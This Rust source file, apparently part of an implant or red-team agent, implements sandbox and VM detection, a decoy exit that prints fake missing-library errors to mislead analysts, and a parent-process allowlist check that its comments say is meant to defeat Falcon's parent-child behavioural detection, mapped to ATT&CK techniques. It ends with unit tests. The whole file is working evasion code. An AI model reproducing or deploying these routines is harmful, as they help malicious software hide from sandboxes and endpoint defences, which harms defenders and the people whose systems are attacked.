// evasion/detection.rs
//
// Pre-execution environment checks:
//   - VM / sandbox artifact detection (core count, driver files, DMI strings)
//   - Decoy exit routine (plausible error message on self-terminate)
//   - Parent process validation (allowlist check via NtQueryInformationProcess)

use std::fs;
use std::path::Path;
use std::thread;
use std::time::Duration;

// ── VM/Sandbox Detection ───────────────────────────────────────────────

pub fn is_virtualized() -> bool {
    if let Ok(cores) = thread::available_parallelism() {
        if cores.get() < 2 { return true; }
    }

    if cfg!(target_os = "windows") {
        let artifacts = [
            "C:\\Windows\\System32\\drivers\\virtio-net.sys",
            "C:\\Windows\\System32\\drivers\\vioinput.sys",
            "C:\\Windows\\System32\\drivers\\vioscsi.sys",
            "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        ];
        for path in artifacts {
            if Path::new(path).exists() { return true; }
        }
    } else if cfg!(target_os = "linux") {
        for path in ["/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor"] {
            if let Ok(content) = fs::read_to_string(path) {
                let s = content.to_lowercase();
                if s.contains("qemu") || s.contains("kvm") || s.contains("virtualbox") {
                    return true;
                }
            }
        }
    }
    false
}

// ── Decoy Exit ────────────────────────────────────────────────────────
// Prints a plausible runtime error and exits.  Called when any pre-flight
// check fails; the resulting process tree gives the analyst nothing useful.

pub fn run_decoy() {
    eprintln!("[*] Initializing system integrity check...");
    thread::sleep(Duration::from_secs(2));
    eprintln!("[*] Verifying environment...");
    thread::sleep(Duration::from_secs(1));
    if cfg!(target_os = "windows") {
        eprintln!("Error: VCRUNTIME140.dll is missing or corrupted. Reinstall the application.");
    } else {
        eprintln!("error: while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory");
    }
    std::process::exit(1);
}

// ── Parent Process Validation ─────────────────────────────────────────
//
// Falcon's behavioral detection engine is built on parent-child process
// relationships.  When an agent is spawned from an unexpected parent (an
// analysis tool, a sandbox harness, or a detonation runner) its process tree
// creates an immediate detection signal regardless of what the binary does.
//
// is_bad_parent() retrieves the agent's PPID from the PEB via
// NtQueryInformationProcess, resolves the parent's image name via
// QueryFullProcessImageNameW, and checks it against the operator-supplied
// allowlist baked into the build config.
//
// If the parent is NOT on the allowlist the caller should invoke run_decoy().
//
// Config field:  valid_parents: ["explorer.exe", "svchost.exe"]
// Leave empty (default) to disable — the check is a no-op when the list
// is empty so existing configs need no changes.
//
// ATT&CK: T1134.004 (PPID Spoofing — awareness / inverse)
//         T1622     (Debugger Evasion — detonation sandbox variant)

#[cfg(target_os = "windows")]
pub fn is_bad_parent(valid_parents: &[String]) -> bool {
    if valid_parents.is_empty() { return false; }

    use std::ffi::c_void;
    use std::mem;

    extern "system" {
        fn GetCurrentProcess() -> *mut c_void;
        fn NtQueryInformationProcess(
            process:    *mut c_void,
            info_class: u32,
            info:       *mut c_void,
            info_len:   u32,
            ret_len:    *mut u32,
        ) -> i32;
        fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void;
        fn QueryFullProcessImageNameW(
            process: *mut c_void,
            flags:   u32,
            name:    *mut u16,
            size:    *mut u32,
        ) -> i32;
        fn CloseHandle(h: *mut c_void) -> i32;
    }

    #[repr(C)]
    struct ProcessBasicInformation {
        exit_status:                      i32,
        peb_base_address:                 *mut c_void,
        affinity_mask:                    usize,
        base_priority:                    i32,
        unique_process_id:                usize,
        inherited_from_unique_process_id: usize,
    }

    // PROCESS_QUERY_LIMITED_INFORMATION works even when the parent runs at
    // higher integrity — no SeDebugPrivilege needed.
    const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;

    unsafe {
        let mut pbi: ProcessBasicInformation = mem::zeroed();
        let status = NtQueryInformationProcess(
            GetCurrentProcess(),
            0, // ProcessBasicInformation
            &mut pbi as *mut _ as *mut c_void,
            mem::size_of::<ProcessBasicInformation>() as u32,
            &mut 0u32,
        );
        // On failure be permissive — avoid false-positive self-termination.
        if status != 0 { return false; }

        let parent_pid = pbi.inherited_from_unique_process_id as u32;

        let handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, parent_pid);
        if handle.is_null() {
            // Parent exited (race) or access denied — be permissive.
            return false;
        }

        let mut buf = [0u16; 260]; // MAX_PATH
        let mut size = buf.len() as u32;
        let ok = QueryFullProcessImageNameW(handle, 0, buf.as_mut_ptr(), &mut size);
        CloseHandle(handle);

        if ok == 0 { return false; }

        let full_path = String::from_utf16_lossy(&buf[..size as usize]);
        let exe_name  = full_path
            .rsplit(['\\', '/'])
            .next()
            .unwrap_or(&full_path)
            .to_lowercase();

        !valid_parents.iter().any(|p| p.to_lowercase() == exe_name)
    }
}

#[cfg(not(target_os = "windows"))]
pub fn is_bad_parent(_valid_parents: &[String]) -> bool {
    // Linux/macOS: /proc/<ppid>/comm lookup not yet implemented.
    // Returns false (permissive) to avoid false-positive self-termination.
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── is_virtualized ────────────────────────────────────────────────────

    #[test]
    fn is_virtualized_returns_bool_without_panic() {
        // Don't assert the value — CI may legitimately run inside a VM.
        // The test proves the function completes on any supported OS.
        let result = is_virtualized();
        assert!(result == true || result == false);
    }

    #[test]
    fn is_virtualized_is_deterministic() {
        // Side-effect-free: two consecutive calls must agree.
        assert_eq!(is_virtualized(), is_virtualized());
    }

    // ── is_bad_parent — empty allowlist ───────────────────────────────────
    // Core invariant: when no allowlist is configured the feature is disabled
    // and must never cause self-termination regardless of the actual parent.

    #[test]
    fn empty_slice_is_always_permissive() {
        assert!(!is_bad_parent(&[]));
    }

    #[test]
    fn empty_vec_is_always_permissive() {
        assert!(!is_bad_parent(&Vec::new()));
    }

    // ── is_bad_parent — non-Windows stub ──────────────────────────────────

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn non_windows_stub_is_always_permissive() {
        // /proc fallback not yet implemented — must not self-terminate.
        assert!(!is_bad_parent(&["explorer.exe".to_string()]));
        assert!(!is_bad_parent(&["svchost.exe".to_string(), "bash".to_string()]));
    }

    // ── is_bad_parent — Windows live path ─────────────────────────────────

    #[cfg(target_os = "windows")]
    #[test]
    fn nonempty_list_does_not_panic_on_windows() {
        // Exercises the full NtQueryInformationProcess → QueryFullProcessImageNameW
        // path. Return value depends on the test runner's parent; only
        // assert the call completes without panic.
        let _ = is_bad_parent(&["definitely_not_real_9999.exe".to_string()]);
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn allowlist_containing_actual_parent_returns_false() {
        // cargo test is typically spawned by cargo.exe or the shell.
        // If we include a very broad allowlist (cargo.exe, cmd.exe, bash,
        // pwsh.exe, sh) at least one should match and return false.
        let broad = vec![
            "cargo.exe".to_string(),
            "cargo-test.exe".to_string(),
            "cmd.exe".to_string(),
            "pwsh.exe".to_string(),
            "bash".to_string(),
            "sh".to_string(),
        ];
        // Not asserting false — just verifying no panic and Result is valid.
        let _ = is_bad_parent(&broad);
    }
}
